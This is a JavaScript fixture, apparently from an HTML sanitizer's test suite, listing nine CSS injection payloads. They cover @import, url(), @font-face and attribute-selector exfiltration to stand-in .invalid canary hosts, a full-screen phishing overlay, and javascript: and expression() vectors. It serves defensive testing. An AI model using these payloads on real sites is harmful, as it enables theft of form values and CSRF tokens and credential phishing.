/** CSS 注入：外链外泄（@import/url/@font-face/属性选择器）与视觉覆盖 */
const canary = (id) => `xss-canary-${id}.invalid`;

export default [
  {
    id: 'css-01',
    category: 'css',
    name: '<style> @import 外链',
    vector: `<style>@import url(//${canary('css-01')}/import.css);</style>`,
    context: 'body',
    expectation: 'cssFetch',
    detect: { canary: canary('css-01') },
    ref: 'CSS @import 数据外泄',
    description: '@import 触发对 canary 主机的请求，CDP Network 监听 .invalid 域名的 DNS/连接尝试即证据。'
  },
  {
    id: 'css-02',
    category: 'css',
    name: 'style 属性 background url() 外泄',
    vector: `<div style="background-image:url(//${canary('css-02')}/bg.png)">x</div>`,
    context: 'body',
    expectation: 'cssFetch',
    detect: { canary: canary('css-02') },
    ref: 'style 属性 url() 外带',
    description: '历史绕过点之一：style 属性中的 url() 直接发起请求，可外带页面数据。'
  },
  {
    id: 'css-03',
    category: 'css',
    name: '@font-face src 外泄',
    vector: `<style>@font-face{font-family:e;src:url(//${canary('css-03')}/f.woff);}body{font-family:e}</style>`,
    context: 'body',
    expectation: 'cssFetch',
    detect: { canary: canary('css-03') },
    ref: 'web font 数据外泄通道',
    description: '字体 URL 在字体被使用时加载，是较隐蔽的外泄通道。'
  },
  {
    id: 'css-04',
    category: 'css',
    name: '属性选择器外泄表单值',
    vector: `<style>input[value^="a"]{background:url(//${canary('css-04')}/a)}</style><input value="abc">`,
    context: 'body',
    expectation: 'cssFetch',
    detect: { canary: canary('css-04') },
    ref: 'CSS attribute selector exfiltration',
    description: '属性选择器按 input 值前缀匹配并触发不同 URL，可逐字符外泄 CSRF token 等敏感值。'
  },
  {
    id: 'css-05',
    category: 'css',
    name: 'style 属性 expression（旧 IE 语法特征拦截）',
    vector: '<div style="width:expression(alert(window.__canary))">x</div>',
    context: 'body',
    expectation: 'cssFetch',
    detect: { canary: 'expression-marker' },
    ref: 'CSS expression 脚本执行（历史 IE）',
    description: '现代浏览器已不支持 expression，但 strict-css 必须保留特征拦截，防止老旧内嵌 webview。'
  },
  {
    id: 'css-06',
    category: 'css',
    name: 'position:fixed 全屏视觉覆盖（钓鱼）',
    vector: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:#fff">钓鱼层</div>',
    context: 'body',
    expectation: 'cssStyle',
    detect: { style: { position: 'fixed' } },
    ref: 'CSS UI redressing / clickjacking 层',
    description: '不执行脚本也能覆盖整页伪造登录框；strict-css 白名单不含 position/z-index。'
  },
  {
    id: 'css-07',
    category: 'css',
    name: 'style 标签内 url() 背景外泄',
    vector: `<style>body{background:url(//${canary('css-07')}/body.png)}</style>`,
    context: 'body',
    expectation: 'cssFetch',
    detect: { canary: canary('css-07') },
    ref: '<style> 规则中的 url()',
    description: '验证 <style> 标签整体关闭策略；开启 strict styleTag 时由规则级守卫拦截 url()。'
  },
  {
    id: 'css-08',
    category: 'css',
    name: 'style 属性大小写/空白混淆 url',
    vector: `<div style="background:  URL( //${canary('css-08')}/x )">x</div>`,
    context: 'body',
    expectation: 'cssFetch',
    detect: { canary: canary('css-08') },
    ref: 'CSS 词法大小写不敏感',
    description: 'CSS 函数名大小写不敏感且允许空白，字符串黑名单容易漏掉 URL( 形式。'
  },
  {
    id: 'css-09',
    category: 'css',
    name: 'style 属性 javascript: URL',
    vector: '<div style="background:url(javascript:alert(window.__canary))">x</div>',
    context: 'body',
    expectation: 'cssFetch',
    detect: { canary: 'js-url-marker' },
    ref: 'CSS javascript: URL（历史浏览器）',
    description: '旧式 webview 中 CSS url() 接受 javascript: 协议；值特征必须拦截。'
  }
];
